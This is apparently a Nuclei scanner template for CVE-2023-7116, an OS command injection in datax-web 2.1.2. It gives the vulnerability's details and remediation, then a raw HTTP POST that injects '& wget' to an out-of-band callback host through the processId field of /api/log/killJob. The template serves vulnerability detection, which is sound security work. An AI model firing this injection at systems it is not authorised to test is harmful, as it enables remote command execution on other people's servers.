id: CVE-2023-7116

info:
  name: WeiYe-Jing datax-web <= 2.1.2 - OS Command Injection
  author: pussycat0x
  severity: medium
  description: |
    A vulnerability, which was classified as critical, has been found in WeiYe-Jing datax-web 2.1.2. Affected by this issue is some unknown functionality of the file /api/log/killJob of the component HTTP POST Request Handler. The manipulation of the argument processId leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-249086 is the identifier assigned to this vulnerability.
  impact: |
    Authenticated attackers with low privileges can inject and execute arbitrary OS commands via the processId parameter, potentially gaining full system access.
  remediation: |
    Update datax-web to a version newer than 2.1.2.
  reference:
    - https://vuldb.com/?ctiid.249086
    - https://vuldb.com/?id.249086
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 6.3
    cve-id: CVE-2023-7116
    cwe-id: CWE-78
    epss-score: 0.53813
    epss-percentile: 0.9791
    cpe: cpe:2.3:a:datax-web_project:datax-web:2.1.2:*:*:*:*:*:*:*
  metadata:
    vendor: datax-web_project
    product: datax-web
  tags: cve,cve2023,datax-web,oast,rce,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "<title>Datax Web"
        internal: true

  - raw:
      - |
        POST /api/log/killJob HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"processId":"1 & wget http://{{interactsh-url}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100a1b6f1881f88a84390b4dbea7766630c8f13dcd8e3607c09cea6c93851ac62f9022100986153a56c7b043fe3cdbf6037ac2bc175c91e9a7adeb67572a3e47383101c92:922c64590222798bb761d5b6d8e72950